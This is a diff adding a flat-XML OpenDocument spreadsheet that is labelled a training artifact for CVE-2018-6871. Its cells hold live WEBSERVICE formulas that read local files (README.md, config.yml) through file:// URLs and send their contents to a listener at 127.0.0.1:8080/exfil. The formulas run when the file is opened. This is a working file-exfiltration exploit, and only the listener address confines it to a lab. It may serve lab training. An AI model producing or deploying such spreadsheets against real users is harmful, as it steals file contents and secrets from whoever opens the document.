@@ -1,0 +1,19 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<office:document
+    xmlns:office="urn:oasis:names:tc:opendocument:xmlns:office:1.0"
+    xmlns:table="urn:oasis:names:tc:opendocument:xmlns:table:1.0"
+    xmlns:text="urn:oasis:names:tc:opendocument:xmlns:text:1.0"
+    xmlns:of="urn:oasis:names:tc:opendocument:xmlns:of:1.2"
+    office:version="1.2"
+    office:mimetype="application/vnd.oasis.opendocument.spreadsheet">
+  <office:body>
+    <office:spreadsheet>
+      <table:table table:name="Sheet1">
+<table:table-row><table:table-cell office:value-type="string"><text:p>WEBSERVICE training artifact (CVE-2018-6871)</text:p></table:table-cell><table:table-cell office:value-type="string"><text:p>TRAINING ARTIFACT — exfiltrates file text to the configured lab listener (http://127.0.0.1:8080/exfil); no file modification or code execution; generated 2026-08-19T14:11:40+00:00</text:p></table:table-cell></table:table-row>
+<table:table-row><table:table-cell office:value-type="string"><text:p>File path</text:p></table:table-cell><table:table-cell office:value-type="string"><text:p>Exfiltrated via WEBSERVICE(&lt;listener&gt;?...&amp;ENCODEURL(WEBSERVICE(file://...)))</text:p></table:table-cell></table:table-row>
+<table:table-row><table:table-cell office:value-type="string"><text:p>README.md</text:p></table:table-cell><table:table-cell table:formula="of:=WEBSERVICE(&quot;http://127.0.0.1:8080/exfil?f=&quot;&amp;ENCODEURL(&quot;README.md&quot;)&amp;&quot;&amp;d=&quot;&amp;ENCODEURL(WEBSERVICE(&quot;file://README.md&quot;)))" office:value-type="string"><text:p></text:p></table:table-cell></table:table-row>
+<table:table-row><table:table-cell office:value-type="string"><text:p>config.yml</text:p></table:table-cell><table:table-cell table:formula="of:=WEBSERVICE(&quot;http://127.0.0.1:8080/exfil?f=&quot;&amp;ENCODEURL(&quot;config.yml&quot;)&amp;&quot;&amp;d=&quot;&amp;ENCODEURL(WEBSERVICE(&quot;file://config.yml&quot;)))" office:value-type="string"><text:p></text:p></table:table-cell></table:table-row>
+      </table:table>
+    </office:spreadsheet>
+  </office:body>
+</office:document>
